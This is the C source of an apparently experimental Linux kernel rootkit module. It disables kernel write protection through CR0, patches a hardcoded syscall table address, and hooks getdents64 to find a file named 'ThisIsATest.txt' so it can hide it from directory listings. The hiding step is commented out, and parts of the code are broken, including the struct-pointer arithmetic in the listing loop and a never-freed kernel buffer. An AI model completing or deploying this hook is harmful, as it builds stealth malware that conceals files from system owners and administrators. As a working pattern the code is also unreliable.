#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/errno.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <linux/dirent.h>
#include <asm/cacheflush.h>
#include <linux/uaccess.h>
 
int new_getdents64(const struct pt_regs *regs);
int load(void);
void unload(void);

typedef asmlinkage int (*original_getdents64_t)(const struct pt_regs *regs);
static unsigned long *syscall_table = (unsigned long *)0xffffffff88c001a0; 
static original_getdents64_t original_getdents64_ptr;
static char *file_name_to_hide = "ThisIsATest.txt";
 
static inline void wp_cr0(unsigned long val) {
    __asm__ __volatile__ ("mov %0, %%cr0": "+r" (val));
}

static inline void zero_cr0(void) {
    printk(KERN_ALERT "Unprotecting mem!");
    wp_cr0(read_cr0() & (~0x10000));
}

static inline void one_cr0(void) {
    printk(KERN_ALERT "Protecting mem...");
    wp_cr0(read_cr0() | 0x10000);
}

asmlinkage int new_getdents64(const struct pt_regs *regs) {
    int total_bytes_read = (int)original_getdents64_ptr(regs);
    struct linux_dirent64 *buff = (struct linux_dirent64*)((char*)regs->si);

    if (total_bytes_read > 0) {
        printk(KERN_ALERT "Total bytes read: %d", total_bytes_read);
        printk(KERN_ALERT "Buffer pointer: %p", buff);

        struct linux_dirent64 *first, *curr, *next;
        first = kvzalloc(total_bytes_read, GFP_KERNEL);
        copy_from_user((void *)first, buff, (unsigned long)total_bytes_read);
        curr = first;

        unsigned short curr_len = curr->d_reclen;
        printk(KERN_ALERT "Current length: %d", curr_len);

        int i = 0;
        while (i < total_bytes_read && curr->d_reclen > 0) {   
            unsigned short curr_len = curr->d_reclen;
            printk(KERN_ALERT "Original: %p. Current pointer: %p has length: %d", first, curr, curr_len);
            if (!strcmp(curr->d_name, file_name_to_hide)) {
            // File matches name to hide, we need to delete it from the array.
                printk(KERN_ALERT "FOUND YOU!");
        //         int length_to_copy = total_bytes_read - i - curr_length;
        //         memmove(curr, next, length_to_copy);

        //         // Array has been shortened by the length of the member we've just deleted.
        //         total_bytes_read -= curr_length;
            }
            curr += curr_len;
            i += curr_len;
        //     // Add the bytes read to si so buff will point to the next member in the array.
        //     curr = next;
        }
    }

    return total_bytes_read;
}
 
int load(void) {
    printk(KERN_ALERT "Initializing...");
    zero_cr0();
    original_getdents64_ptr = (original_getdents64_t)syscall_table[__NR_getdents64];
    printk(KERN_ALERT "%p OWP", original_getdents64_ptr);
    syscall_table[__NR_getdents64] = (unsigned long)new_getdents64;
    printk(KERN_ALERT "Overrided getdents64 ptr!");
    one_cr0();
    printk(KERN_ALERT "Initialized successfuly!");

    return 0;
}
 
void unload(void) {
    printk(KERN_ALERT "Shutting down.");
    zero_cr0();
    syscall_table[__NR_getdents64] = (unsigned long)original_getdents64_ptr;  
    one_cr0();
    printk(KERN_ALERT "Goodbye world...");
}

module_init(load);
module_exit(unload);

MODULE_LICENSE("GPL");